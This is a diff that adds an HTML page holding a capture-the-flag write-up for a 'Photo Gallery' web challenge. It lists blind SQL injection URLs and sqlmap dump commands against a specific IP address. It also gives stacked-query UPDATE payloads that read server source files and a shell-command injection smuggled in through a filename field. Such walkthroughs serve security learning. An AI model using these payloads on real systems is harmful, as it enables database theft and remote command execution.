@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Photo Gallery</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Photo Gallery</h1>
+</header>
+<p>Test sql injection</p>
+<pre><code>http://34.74.105.127/e273dcce57/fetch?id=1
+http://34.74.105.127/e273dcce57/fetch?id=1 AND (select length(database()) == 6
+http://34.74.105.127/e273dcce57/fetch?id=1 AND database() like &#39;level5&#39;
+http://34.74.105.127/e273dcce57/fetch?id=1 AND (select count(1) from information_schema.tables where table_schema=database())=2
+http://34.74.105.127/e273dcce57/fetch?id=1 AND (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6
+http://34.74.105.127/e273dcce57/fetch?id=1 AND (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;albums&#39;
+http://34.74.105.127/e273dcce57/fetch?id=1 AND (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=6
+http://34.74.105.127/e273dcce57/fetch?id=1 AND (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;photos&#39;</code></pre>
+<pre><code>sqlmap -u &quot;http://34.74.105.127/e273dcce57/fetch?id=1&quot; --method GET --dump -D level5 -T photos -p id --code 200 --skip-waf --random-agent --threads 10 -o
+sqlmap -u &quot;http://34.74.105.127/e273dcce57/fetch?id=1&quot; --method GET --dump -D level5 -T albums -p id --code 200 --skip-waf --random-agent --threads 10 -o</code></pre>
+<p>Try to change the title `` http://34.74.105.127/e273dcce57/fetch?id=1;UPDATE%20photos%20set%20title=%27hello%27%20where%20id=2;commit;</p>
+<pre><code>
+Space used: 0 total looks weird
+By setting parent to 0 we get 232K total</code></pre>
+<p>http://34.74.105.127/e273dcce57/fetch?id=1;UPDATE%20photos%20set%20parent=0;commit; http://34.74.105.127/e273dcce57/fetch?id=1;UPDATE%20photos%20set%20filename=%27main.py%27%20where%20id=3;commit</p>
+<pre><code>
+Then visit </code></pre>
+<p>http://34.74.105.127/e273dcce57/fetch?id=3</p>
+<pre><code>
+We get the source code of main.py which contains a flag in comment
+
+By checking the ``main.py``, looks like we can perform shell script injection by modifying filename
+
+Try to check if there is another files other than jpgs in files</code></pre>
+<p>http://34.74.105.127/a3aa84e754/fetch?id=1.1;update%20photos%20set%20filename=%27%20;ls%20files%20–ignore=*.jpg%20%27;commit;</p>
+<pre><code>Well, found nothing here.
+
+How about get the enviroment variables </code></pre>
+<p>http://34.74.105.127/a3aa84e754/fetch?id=1.1;update%20photos%20set%20filename=%27files/env.txt%27%20where%20id=3;commit;</p>
+<pre><code>
+Get the env.txt file via</code></pre>
+<p>http://34.74.105.127/a3aa84e754/fetch?id=3 ```</p>
+<p>There are three flags in env.txt file</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
